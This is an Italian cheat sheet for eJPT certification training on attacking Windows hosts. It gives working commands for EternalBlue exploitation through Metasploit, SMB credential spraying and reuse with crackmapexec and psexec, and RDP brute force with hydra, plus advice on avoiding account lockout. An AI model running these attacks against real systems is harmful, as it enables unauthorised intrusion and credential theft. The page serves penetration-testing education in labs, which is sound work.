---
layout: cheatsheet
cert: ejpt
cert_label: "eJPT"
title: "Windows Host Attacks"
permalink: "/cheatsheet/ejpt/05-system-host-attacks/01-windows-host-attacks/"
section: "System & Host Attacks"
section_order: 5
order: 1
sort_key: 501
---

**Difficoltà:** Intermediate
**Time to Master:** 2.5h
**Prerequisiti:** [../00-Fundamentals/04-Windows-Fundamentals.md](/cheatsheet/ejpt/00-fundamentals/04-windows-fundamentals/), [../04-Vulnerability-Assessment/03-CVE-CVSS-Scoring.md](/cheatsheet/ejpt/04-vulnerability-assessment/03-cve-cvss-scoring/)
**Lab:** INE PTS labs / TryHackMe, Blue, HTB, Legacy

---

## Obiettivo

Hai fatto il vulnerability assessment, hai una lista di CVE in mano: ora è il momento di trasformarla in accesso reale. Qui attacchi i servizi tipici di un host Windows (RDP, SMB, servizi di rete) usando vulnerabilità note e attacchi a credenziali — il primo punto d'appoggio prima di passare a Metasploit e all'exploitation vera e propria. Sono gli attacchi più "affidabili" del blueprint eJPT: poche sorprese, tanta ripetizione, e proprio per questo vale la pena farli bene.

---

## Concetti chiave

### Superficie di attacco tipica Windows

| Servizio | Porta | Rischio comune |
|----------|-------|------------------|
| SMB | 445/139 | RCE note (MS17-010), share leggibili, null session |
| RDP | 3389 | brute force, BlueKeep (CVE-2019-0708) su versioni datate |
| WinRM | 5985/5986 | accesso remoto con credenziali valide |
| MSSQL | 1433 | credenziali deboli, xp_cmdshell per RCE |

### MS17-010 (EternalBlue) come case study

Vulnerabilità nel protocollo SMBv1 di Windows (CVE-2017-0143/0144/0145/0146/0147/0148) che permette RCE non autenticata. Colpisce sistemi Windows non patchati (tipicamente Windows 7/Server 2008 in lab). Se in un lab eJPT trovi SMBv1 aperto e la macchina è vecchia, la prima cosa che ti passa per la testa dovrebbe essere questa CVE: è uno degli esempi più comuni nei lab entry-level per la sua affidabilità e semplicità di sfruttamento tramite Metasploit.

### BlueKeep (CVE-2019-0708)

Vulnerabilità RCE nel Remote Desktop Protocol (RDP) su Windows datati (7/Server 2008 R2) prima dell'autenticazione. Concettualmente simile a MS17-010 ma sul servizio RDP; da conoscere per l'esame anche solo a livello teorico.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| nmap NSE | `nmap --script smb-vuln-ms17-010 -p 445 target` | conferma vulnerabilità | vedi [../04-Vulnerability-Assessment/02-Nmap-NSE-Scripts.md](/cheatsheet/ejpt/04-vulnerability-assessment/02-nmap-nse-scripts/) |
| hydra | `hydra -L users.txt -P pass.txt rdp://target` | credenziali valide | brute force RDP, vedi [03-Password-Attacks-Hydra-John-Hashcat.md](/cheatsheet/ejpt/05-system-host-attacks/03-password-attacks-hydra-john-hashcat/) |
| crackmapexec/netexec | `nxc smb target -u users.txt -p pass.txt` | spray credenziali su SMB | ottimo per password spraying su più host |
| psexec.py (Impacket) | `psexec.py user:pass@target` | shell system-level | richiede credenziali admin valide |

---

## Payload / Esempi

### Esempio 1: verifica MS17-010 e sfruttamento con Metasploit

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; run"
```

**Output atteso:**
```
[*] Started reverse TCP handler
[+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010!
[*] Meterpreter session 1 opened
```

**Spiegazione:** prima si conferma la vulnerabilità con NSE, poi si usa il modulo Metasploit dedicato (vedi [../07-Metasploit-Framework/03-Exploit-Modules.md](/cheatsheet/ejpt/07-metasploit-framework/03-exploit-modules/)) per ottenere una sessione meterpreter SYSTEM.

### Esempio 2: accesso con credenziali già note (credential reuse)

```bash
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123!'
psexec.py admin:'Password123!'@10.10.10.5
```

**Spiegazione:** se una password e stata trovata (es. in uno share SMB, vedi [../03-Enumeration/01-SMB-NetBIOS-Enumeration.md](/cheatsheet/ejpt/03-enumeration/01-smb-netbios-enumeration/)), si verifica il riuso su tutta la rete prima di provare exploit più complessi: spesso e la via più rapida in un lab eJPT.

### Esempio 3: brute force RDP mirato

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.5 -t 4
```

**Output atteso:**
```
[3389][rdp] host: 10.10.10.5   login: administrator   password: Summer2023!
```

**Spiegazione:** RDP tollera pochi tentativi al secondo (`-t 4` basso) per evitare lockout account; usare solo con wordlist mirate, non rockyou intero, per restare in tempi ragionevoli.

---

## Evasion / Bypass Techniques

Su host con account lockout policy attiva, il brute force classico può bloccarti l'utente target prima ancora di trovare la password giusta — un modo pessimo per finire un lab. Preferisci il **password spraying** (poche password comuni su molti utenti) al brute force classico (molte password su un utente): resti sotto la soglia di lockout e spesso trovi comunque qualcosa.

---

## Lab Hands-On

### Lab 1: TryHackMe, Blue
**Obiettivo:** sfruttare MS17-010 su una macchina Windows 7 di lab
**Difficulty:** Facile
**Time:** 45 min

**Walkthrough breve:**
1. Scansiona e conferma la vulnerabilità SMB con NSE
2. Usa il modulo Metasploit ms17_010_eternalblue per ottenere shell
3. Da meterpreter, esegui `getuid` per confermare i privilegi ottenuti

---

## Common Mistakes

- Provare l'exploit senza aver confermato la vulnerabilità -> spreco di tempo su target non vulnerabili
- Brute force RDP con wordlist enormi senza throttling -> lockout dell'account o rilevazione da parte di sistemi di difesa
- Dimenticare di provare credenziali già trovate su TUTTI i servizi Windows (SMB/RDP/WinRM) -> credential reuse e molto comune nei lab

---

## Link Utili

- [MS17-010 advisory: Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Impacket toolkit: GitHub](https://github.com/fortra/impacket)

---

## Connessioni

- **Prerequisito:** [../00-Fundamentals/04-Windows-Fundamentals.md](/cheatsheet/ejpt/00-fundamentals/04-windows-fundamentals/)
- **Prossimo Step:** [03-Password-Attacks-Hydra-John-Hashcat.md](/cheatsheet/ejpt/05-system-host-attacks/03-password-attacks-hydra-john-hashcat/)
- **Combinazione con:** [../07-Metasploit-Framework/03-Exploit-Modules.md](/cheatsheet/ejpt/07-metasploit-framework/03-exploit-modules/)

---

## Checklist di padronanza

- [ ] So verificare e sfruttare MS17-010 con Metasploit
- [ ] So usare credenziali trovate per accesso diretto (psexec/crackmapexec)
- [ ] So eseguire un brute force RDP mirato senza causare lockout
- [ ] Conosco a livello concettuale BlueKeep
